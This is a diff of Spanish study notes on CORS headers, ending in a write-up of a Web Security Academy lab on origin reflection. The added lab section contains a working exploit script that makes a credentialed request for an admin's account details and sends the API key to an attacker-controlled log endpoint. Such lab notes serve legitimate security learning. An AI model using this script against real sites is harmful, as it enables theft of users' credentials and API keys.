@@ -55,6 +55,11 @@ a mi serverapi.com (pero este tambien tiene un campo origen cuando se manda la r
 revisa si este origen tiene permisos para pedir datos del servidor( para apis por ejemplo la poken api queremos que todos puedan solicitar datos entonces se usa el asterisco
 en la Access-Control-Allow-Origin:*) si no los tiene pues regresa el error de CORS si si esta permitido ese "origen" pues regresa los datos.
 
+## Access-Control-Allow-Credentials
+
+> El encabezado Access-Control-Allow-Credentials funciona junto con la propiedad XMLHttpRequest.withCredentials o con la opción credentials en el constructor Request() de la API Fetch. Para una solicitud CORS con credenciales, para que los navegadores expongan la respuesta al código JavaScript de la interfaz, tanto el servidor (usando el encabezado Access-Control-Allow-Credentials ) como el cliente (configurando el modo de credenciales para XHR, Fetch o Solicitud Ajax) debe indicar que están optando por incluir credenciales.
+Osea permiten que el cliente sepa que se pueden hacer peticiones cruzadas con credenciales.
+
 ## XMLHttpRequest.withCredentials
 
 > La propiedad XMLHttpRequest.withCredentials es un valor booleano que indica si se deben realizar o no solicitudes de Access-Control sitios utilizando credenciales como cookies, encabezados de autorización o certificados de cliente TLS. La configuración con withCredentials no tiene ningún efecto en las solicitudes del mismo sitio.
@@ -71,7 +76,50 @@ xhr.send(null
 
 # CORS vulnerability with basic origin reflection
 
+Para este lab primero se verifica que la pagina es vulnerable poniendo un Origen aleatoreo por ejemplo Origin:www.evil.com esto se pone en la 
+pagina donde se ve los detalles de la cuenta entonces con el repeater se renvia y lo que se nota es que 
+ese mismo origen que inyectamos se ve reflekado en la respuesta junto con las respectivas cabeceras: 
 
+```
+Access-Control-Allow-Origin: www.evil.com
+Access-Control-Allow-Credentials: true
+
+```
+
+Entonces el ataque consiste en lo siguiete: Crear un scritp que se aproveche de esta vulnerabilidad de aceptar cualquier origen, que un usuario admin oprima el 
+link donde esta el script este lo que hace es generar una  peticion hacia account details de ahi saca los datos que es el token de la api para posteriormente
+generar una peticion a un servidor del atacante en donde se manda los datos del admin.
+
+```
+
+<html>
+<head>
+<body>
+<script>
+	
+ var xhr = new XMLHttpRequest(); // creamos un objeto para poder hacer peticiones
+ var url = "https://0ac60051041133d6c0b462860014009b.web-security-academy.net/accountDetails"; // definimos la url donde regresa el token de un usuario
+
+ xhr.onreadystatechange = function() { // esta funcion sirve para que cuando se genere el evento de DONE que es cuando la pagina ya termina de tardar
+ if (xhr.readyState == XMLHttpRequest.DONE) {
+ fetch("/log?key=" + xhr.responseText)// es una peticion al servidor del atacante con los datos que le intersa robar como es asincrono hasta que se genere no
+// ejecuta este codigo
+ 	}
+ }
+
+ 
+ xhr.open('GET',url,true) // le que tipo de peticion se tiene que hacer  la url y true para decirle que se pueden hacer peticiones asincronas
+ xhr.withCredentials = true;// Para que permita peticiones cruzadas con cookies y cledenciales
+ xhr.send(null);// envio de la peticion inicial
+
+
+
+</script>
+
+</body>
+</html>
+
+```
 
 
 
